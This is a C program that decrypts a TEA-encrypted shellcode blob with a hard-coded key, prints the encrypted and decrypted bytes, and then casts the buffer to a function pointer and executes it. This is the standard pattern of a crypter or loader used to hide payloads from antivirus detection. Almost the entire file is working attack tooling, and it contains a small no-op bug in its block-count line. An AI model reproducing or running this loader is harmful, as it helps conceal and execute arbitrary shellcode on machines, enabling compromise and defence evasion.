#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define BLOCKSIZE 8

void decrypt(long *v, long *k) {
    unsigned long v0=v[0], v1=v[1], sum=0xC6EF3720, i;  /* set up */
    unsigned long delta=0x9e3779b9;                     /* a key schedule constant */
    unsigned long k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
    for (i=0; i<32; i++) {
        v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
        v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        sum -= delta;
    }
    v[0]=v0;
    v[1]=v1;
}

void decryptBlocks(char *dataptr_in, char *keyptr_in) {

    int i = 0, blockcount;
    long *dataptr = (long *)dataptr_in;
    long *keyptr = (long *)keyptr_in;

    blockcount = strlen(dataptr_in) / BLOCKSIZE;
    blockcount = 0 ? 1 : blockcount; 

    while (i < blockcount) {
        decrypt(dataptr + (i * 2), keyptr);
        i += 1;
    }

}

void printShellCode(char *shellcode) {

    int i;

    printf("Length = %d, Shellcode = ", strlen(shellcode)); 
    for(i=0; i<strlen(shellcode); i++) {
        printf("\\x%02x", (unsigned char)(int)shellcode[i]);
    }
    printf("\n");

}

int main(int argc, char *argv[]) {

    unsigned char encShellcode[] = "\xc6\xcf\x0a\xa6\x1e\x98\xf6\xa9\xd4\xf2\xcc\x0c\x16\x0c\xb4\xe2\x24\xcc\xf6\xf8\x34\x44\x8e\xd8\x80";
    unsigned char key[] = "tiptiptiptiptip8";

    //char *str;
    //str = encShellcode;

    char str[512];
    strcpy(str, encShellcode); 

    printf("[Encrypted]\n");
    printShellCode(encShellcode);
    
    decryptBlocks(str, key);

    printf("[Source]\n");
    printShellCode(str);
    printf("\n");

    int (*ret)() = (int(*)())str; 
    ret();

    return 0;

}
